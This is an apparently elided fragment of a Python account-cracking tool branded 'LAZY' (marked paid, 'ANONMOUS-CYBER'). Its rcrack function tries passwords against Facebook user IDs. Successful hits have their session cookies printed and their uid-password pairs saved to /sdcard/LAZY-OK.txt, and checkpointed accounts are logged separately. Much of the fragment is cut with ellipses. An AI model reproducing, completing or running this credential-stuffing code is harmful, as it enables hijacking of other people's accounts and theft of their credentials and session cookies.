...
│ ██    █████ ██████ ██ ██ │TOOL NAME : LAZY     │
│ ██    ██  ██  ██  ██ ██           │ TOOL STATE : PAID    │
│ ██    ███████  ███  ████   │ TOOL VERSION 0.8     │           │ ██      ██   ██  ███       ██    │ CREATED BY MD ATIK │                                                 │ ███████ ██   ██ ███████    ██    │ BEALIVE YOUE SELF    │                                                 ╰──────────────────────────────────┴──────────────────
...
def rcrack(uid,pwx,tl):
    ...
    # 'cookie': 'datr=nqQaZajs-O3yj5dkePCMmFxV; sb=nqQaZWuEugBdTrt9WrN3kpFW; m_pixel_ratio=2; wd=360x412; fr=05Nc6LpYrUrvzuZkV..BlGqSe.Xs.AAA.0.0.BlGqSn.AWVQjrsTkbI',
    'dpr': '2',
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m [LAZY-OK] ' +cid+ ' | ' +ps+    '  \n \033[1;33mCOOKIE= \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/LAZY-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\r\r\33[1;31m [LAZY-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/LAZY-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s {x}[{xr} ANONMOUS-CYBER {x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
